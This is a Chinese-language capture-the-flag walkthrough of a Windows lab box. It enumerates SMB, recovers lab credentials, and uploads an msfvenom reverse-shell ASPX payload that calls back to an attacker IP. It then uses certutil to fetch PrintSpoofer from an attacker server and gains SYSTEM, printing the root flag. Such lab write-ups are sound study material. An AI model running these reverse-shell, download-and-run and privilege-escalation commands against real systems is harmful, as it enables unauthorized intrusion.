# Relevant

您已被分配到需要渗透测试的客户 在 7 天内发布到生产环境中进行。

工作范围

客户端请求 工程师进行评估 提供的虚拟环境。客户要求最小 提供有关评估的信息，希望参与 从恶意行为者的眼睛进行（黑匣子渗透 测试）。客户端要求您保护两个标志（无位置） 提供）作为剥削的证据：

user.txt
root.txt
此外，客户还提供了以下范围津贴：

此服务中允许使用任何工具或技术，但我们要求您先尝试手动利用
找到并记下发现的所有漏洞
将发现的标志提交到仪表板
只有分配给计算机的 IP 地址在范围内
查找并报告所有漏洞（是的，根路径不止一条）

---

循例 nmap 扫，80的web访问不了，检索smb看看

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">smbclient</font> <font color="#9755B3">-L</font> 10.10.162.209  </pre>

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">smbclient</font> //10.10.162.209/nt4wrksv 
Password for [WORKGROUP\root]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Jul 26 05:46:04 2020
  ..                                  D        0  Sun Jul 26 05:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 23:15:33 2020</pre>

疑似密码，get下来后打开

是base64，解码后：

    Bob - !P@$$W0rD!123
    Bill - Juw4nnaM4n420696969!$$$

到这里线索断了，因为也没有开ssh，也没有web，我重新运行nmap，但这次我扫了全部端口，果然还有隐藏端口：

    49663/tcp open  unknown
    49667/tcp open  unknown
    49669/tcp open  unknown

使用nc、curl逐个连接看看:

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">curl</font> http://10.10.162.209:49663</pre>

这个端口获得了响应

gobuster扫一波

    /aspnet_client

此外就没别的了，正当我想随便输入个错误路径时，发现没有任何错误页面和回显

随便搞了搞，会想起刚刚的smb目录，我想反正也没啥了，干脆试试，没想到又撞对了：

    http://10.10.162.209:49663/nt4wrksv/passwords.txt

居然访问到了smb的目录的文件

我们试试有没有权限写入文件

<pre>smb: \&gt; put ./passwords.txt psssss.txt
putting file ./passwords.txt as \psssss.txt (0.1 kb/s) (average 0.1 kb/s)
smb: \&gt; ls
  .                                   D        0  Sun Dec 18 23:07:56 2022
  ..                                  D        0  Sun Dec 18 23:07:56 2022
  passwords.txt                       A       98  Sat Jul 25 23:15:33 2020
  psssss.txt                          A       98  Sun Dec 18 23:07:56 2022

		7735807 blocks of size 4096. 5136276 blocks available
</pre>

很好，那么根据一般思路，应该就是要上传个reverse shell然后在web上访问getshell

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">msfvenom</font> <font color="#9755B3">-p</font> windows/x64/shell_reverse_tcp lhost=10.11.17.14 lport=8888 <font color="#9755B3">-f</font> asp <font color="#277FFF"><b>&gt;</b></font> she11.asp </pre>

    smb: \> put ./she11.asp

开启nc监听，访问web

getshell翻车了，没事，按照已经做过的题的思路，我们换个shell后缀再尝试一下，asp不行尝试aspx

尝试这两个是因为上面gobuster扫描到的那个目录，加上是iis

    http://10.10.162.209:49663/nt4wrksv/she11.aspx

成功getshell

---

查询systeminfo和whoami /priv

    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
    SeCreateGlobalPrivilege       Create global objects                     Enabled 

SeImpersonatePrivilege，这里可以尝试模拟令牌

通过PrintSpoofer帮助我们利用

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">python3</font> <font color="#9755B3">-m</font> http.server 8000</pre>

    目标上：certutil.exe -urlcache -split -f http://10.11.17.14:8000/PrintSpoofer64.exe

<pre>C:\Windows\Temp&gt;PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

</pre>

成功提权root

<pre>C:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}</pre>
